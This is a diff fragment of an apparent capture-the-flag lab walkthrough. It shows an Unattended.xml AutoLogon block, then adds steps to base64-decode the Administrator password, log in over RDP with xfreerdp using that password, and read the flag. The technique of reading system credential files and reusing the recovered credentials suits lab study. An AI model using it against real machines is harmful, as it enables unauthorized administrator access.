@@ -195,3 +195,10 @@ PS C:\Users\dark> type C:\Windows\Panther\Unattend\Unattended.xml
     <Enabled>true</Enabled>
     <Username>Administrator</Username>
 </AutoLogon>
+
+5. Now base64 decode the password.
+6. from attackbox:
+xfreerdp /v:10.10.132.227 /u:'corp.locl\Administrator' /p:'tqjJpEX9Qv8ybKI3yHcc=L!5e(!wW;$T'
+** One Point to be noted that we've to manually input password again to change it.
+7. in the desktop of Administrator got the flag
+
